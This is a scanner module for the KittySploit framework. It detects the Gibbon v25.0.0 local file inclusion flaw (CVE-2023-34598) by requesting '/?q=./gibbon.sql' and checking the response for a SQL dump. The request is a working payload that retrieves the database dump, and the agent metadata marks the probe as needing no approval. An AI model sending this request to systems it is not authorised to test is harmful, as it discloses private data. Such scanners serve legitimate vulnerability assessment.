#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Gibbon v25."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Gibbon v25.0.0 - Local File Inclusion Detection',
        'description': "Gibbon v25.0.0 is vulnerable to a Local File Inclusion (LFI) vulnerability where it's possible to include the content of several files present in the installation folder in the server's response.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'gibbon', 'lfi', 'gibbonedu', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/maddsec/CVE-2023-34598',
            'https://twitter.com/shaybt12/status/1673612503547355137?s=20',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-34598',
            'https://github.com/izj007/wechat',
            'https://github.com/komodoooo/Some-things',
        ],
        'cve': 'CVE-2023-34598',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?q=./gibbon.sql', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('phpMyAdmin SQL Dump', 'gibbon',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="Gibbon v25.0.0 - Local File Inclusion detected",
                path='/?q=./gibbon.sql',
            )
            return True
        return False

